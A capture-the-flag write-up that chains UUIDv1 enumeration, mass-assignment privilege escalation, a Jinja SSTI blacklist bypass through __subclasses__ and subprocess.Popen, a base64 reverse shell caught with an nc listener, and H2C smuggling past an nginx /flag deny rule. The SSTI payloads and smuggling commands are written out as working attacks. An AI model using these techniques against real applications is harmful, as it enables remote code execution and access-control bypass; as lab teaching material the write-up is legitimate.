## Challenge Description

{{ page.info.description }}

## Recon & UUIDv1 Enumeration

After signing up, the site is almost empty—comments are **disabled** "due to abuse", and only a status page gives a bit of info:

![]({{ page.img_path }}ae1a82dcbb924d56acbb77d992b8c280.png)

On `/statut`, we spot:
- server start date/time
- uptime duration
- internal clock sequence
- user count

When viewing our profile, the URL is `/user/bf5fc01c-5521-11f0-a4f1-0242ac10442a`—an [UUIDv1](https://www.uuidtools.com/uuid-versions-explained), which is based on the current time and the MAC address (or "node").

![]({{ page.img_path }}62a6f73111b342dcb4e985a0609ef8d7.png)

With the timestamp from `/statut` and our own UUID, we can try to **brute-force all possible UUIDs** created in the same window (homemade script):

```bash
python uuidFinder.py --range 30000 --step 10
````

Example output:

```
7886f7a0-5459-11f0-afde-0242ac1040a2
78872c7a-5459-11f0-afde-0242ac1040a2
78874dcc-5459-11f0-afde-0242ac1040a2
78874f84-5459-11f0-afde-0242ac1040a2
# ...
```

Most are normal users, but eventually one stands out as **admin**:

## Privilege Escalation: Modifying User Role

The admin profile reveals an unknown field: `is_super_mega_powerfull_admin`, so we send a POST to the profile edit page with this new parameter to become an administrator.

```json
{
  "username": "Sonic",
  "email": "sonic@sega.com",
  "is_super_mega_powerfull_admin": "True"
}
```

After reloading, the UI shows new admin features—**comment add/delete** is unlocked:

## Template Injection (SSTI): Breaking the Blacklist

Posting the payload {% raw %}`{{ 7*7 }}`{% endraw %} returns `49`, confirming **SSTI**.

![]({{ page.img_path }}46a1b78bfa7e4472a5e71c043086f328.png)

Trying more advanced payloads quickly hits a blacklist:

* `[`, `]`, `|`, `import`, `__builtins__` are blocked.

I couldn't find the right out-of-the-box payload to use Popen (although it did exist).
The payload was simply : {% raw %}`{{ cycler.__init__.__globals__.os.popen('id').read() }}`{% endraw %}

Instead, I used a much more generic method that works almost every time.
In Python, you can still enumerate all classes via `object.__subclasses__()`.
The goal is to find the index of `subprocess.Popen` and use it for RCE.

To inspect subclasses without `[]` we can use `__getitem__`:

{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(x)}}
```
{% endraw %}

So, brute-force indexes, increasing `x` until you spot:

```
<class 'subprocess.Popen'>
```

For me, it was at index 370 (homemade script):

{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(370)}}
```
{% endraw %}
![]({{ page.img_path }}266141f38469455095f4adaed9d65f43.png)


Test command execution with:
{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(370)("id",shell=True,stdout=-1).communicate()}}
```
{% endraw %}

Returns:

## Getting a Reverse Shell

We can now upload a Python reverse shell in base64, decode it and run it:

**Step 1: Upload reverse shell (base64-encoded)**
{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(370)("echo 'cHl...==' > shell.b64",shell=True,stdout=-1).communicate()}}
```
{% endraw %}

**Step 2: Decode to file**
{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(370)("base64 -d shell.b64 > shell",shell=True,stdout=-1).communicate()}}
```
{% endraw %}

**Step 3: Execute**
{% raw %}
```python
{{().__class__.__base__.__subclasses__().__getitem__(370)("bash shell",shell=True,stdout=-1).communicate()}}
```
{% endraw %}

On the listener:

```
$ nc -lvnp 4444
Listening on 0.0.0.0 4444
root@app:/app# ls
__pycache__     app.py      instance          shell      templates
all_users.json  backup.txt  requirements.txt  shell.b64
```

## Network Pivoting: H2C Smuggling

Inside the shell, we find `backup.txt`:

```
Backup of the nginx conf

curl https://nginx:8888 -k

worker_processes 1;
events { worker_connections 1024; }

http {
    server {
        listen       8888 ssl;
        http2 on;
        server_name  nginx localhost;

        access_log  /var/log/nginx/access.log;
        error_log  /var/log/nginx/error.log;

        ssl_certificate     /etc/ssl/certs/selfsigned.crt;
        ssl_certificate_key /etc/ssl/private/selfsigned.key;

        location / {
            proxy_pass         http://127.0.0.1:80/;
            proxy_http_version 1.1;
            proxy_set_header Upgrade $http_upgrade;
            proxy_set_header Connection $http_connection;
        }
        location /flag {
            deny all;
        }
    }
}
```

This looks like a backup of the nginx configuration of a local server (on the same network as the machine we've taken control of). It seems to be the reverse proxy config. This proxy seems to forward all our requests to the backend server except for `/flag` which is denied by the proxy but probably not by the backend.

Request to `/flag` is forbidden:

```
curl -k https://nginx:8888/flag
# <html>...<h1>403 Forbidden</h1>...</html>
```

But the config is vulnerable to **H2C Smuggling** ([BishopFox blog](https://bishopfox.com/blog/h2c-smuggling-request)), since `Upgrade` and `Connection` headers are blindly forwarded and the backend server uses `HTTP/1.1`.

![]({{ page.img_path }}2554eaea51c8480d9df4c77a86dfa28d.png)


So we can download the [h2csmuggler tool](https://github.com/BishopFox/h2csmuggler), upload it, then:

```bash
python3 h2csmuggler.py -x https://nginx:8888 --test
# [INFO] h2c stream established successfully.
```

Seems to work !

Exploit:

```bash
python3 h2csmuggler.py -x https://nginx:8888 http://127.0.0.1/flag
:status: 200
content-type: text/plain; charset=utf-8
content-length: 32

SHLK{0m6_y0u_4r3_1n_7h3_b4ck3nd}
```

We got the flag !

## TL;DR

* UUIDv1: Brute-force all user IDs using timestamps and profile URL.
* Arbitrary profile field: Set `is_super_mega_powerfull_admin` for admin features.
* Python SSTI: Blacklist bypass, gain RCE.
* Network pivoting with H2C Smuggling: Abuses nginx reverse proxy misconfiguration, direct access to `/flag`.
